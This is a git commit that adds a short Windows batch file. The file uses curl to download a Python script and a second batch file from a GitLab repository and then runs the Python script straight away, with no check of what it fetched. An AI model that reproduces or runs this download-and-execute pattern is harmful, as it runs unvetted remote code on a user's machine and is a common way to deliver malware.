e54322d412d54695fdf51d456afd9f9c962e2093
menia12 <160221779+menia12@users.noreply.github.com>
2024-05-12 22:37:36 +0700

    Create main.bat

---
+++ main.bat
@@ -0,0 +1,4 @@
+@echo off
+curl -L -o time.py https://gitlab.com/rifqiekhafi/setrum/-/raw/main/time.py?inline=false
+curl -L -o glow.bat https://gitlab.com/rifqiekhafi/setrum/-/raw/main/glow.bat?inline=false
+python time.py
